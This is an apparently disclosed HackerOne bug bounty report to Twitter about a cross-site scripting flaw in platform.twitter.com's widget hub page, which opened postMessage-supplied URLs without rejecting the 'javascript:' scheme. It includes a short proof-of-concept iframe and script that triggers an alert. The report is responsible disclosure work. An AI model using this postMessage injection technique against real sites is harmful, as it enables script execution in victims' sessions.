WeaknessName:Cross-site Scripting (XSS) - Generic
Reporter:https://hackerone.com/batram
ReportedTo:Twitter(twitter)

Severity:
State:Closed
DateOfDisclosure:17.11.2014 14:30:52

Summary:

Since you have fixed a few problems with the FlashTransport on platform.twitter.com already,
I though I would also take a look at the JavaScript around it.

_Problem URL:_
https://platform.twitter.com/widgets/hub.html

__Description:__
The mentioned page opens URLs send to it via postMessage or FlashTransport without checking for an 'javascript:'-prefix, resulting in XSS on platform.twitter.com. Since the URL gets open in a popup, popups need to be allowed or the opening a result of user interaction. 

__PoC:__

    <iframe src="https://platform.twitter.com/widgets/hub.html" id="iframe"></iframe>

    <script>
      var win = document.getElementById("iframe").contentWindow

      function fire() {
        win.postMessage(
          '{"id": 12, "method": "openIntent", "params":["javascript:alert(document.domain)"]}',
          "https://platform.twitter.com/" 
        )
      }

      function listener(e){
        console.log(e.data);
        if(e.data == '__ready__')
          fire();
      }

      if (window.addEventListener){
        addEventListener("message", listener, false)
      } else {
        attachEvent("onmessage", listener)
      }
    </script>
